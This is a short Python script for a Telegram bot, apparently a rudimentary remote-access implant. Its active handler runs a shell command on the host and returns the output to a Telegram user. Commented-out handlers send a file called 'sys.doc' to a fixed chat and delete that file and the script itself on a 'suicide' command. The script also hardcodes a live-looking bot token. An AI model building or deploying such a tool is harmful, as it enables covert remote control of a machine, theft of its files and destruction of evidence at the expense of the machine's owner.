
import telebot
import os
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()


token = "283782883:AAGL26hkLIPYI_6WR62Yq4sU7rtsDPUIPXo"
bot = telebot.TeleBot(token)


@bot.message_handler(commands=['ls'])
def send_welcome(message):
    os.system('ls > ls.txt')
    doc = open('ls.txt','rb')
    doc = doc.read()
    bot.reply_to(message,doc)
    os.system("rm -fr ls.txt")
    


"""
@bot.message_handler(commands=['pwd'])
def enviar_doc(message):
    doc = open('sys.doc','rb')
    bot.send_document('TU_CHAT_ID', doc)   

@bot.message_handler(commands=['suicide'])
def send_welcome(message):
    bot.send_message('TU_CHAT_ID', 'It was an honour')
    os.system('del sys.doc')
    os.system('del secbot.py')
"""
bot.polling(none_stop=False, interval=0)

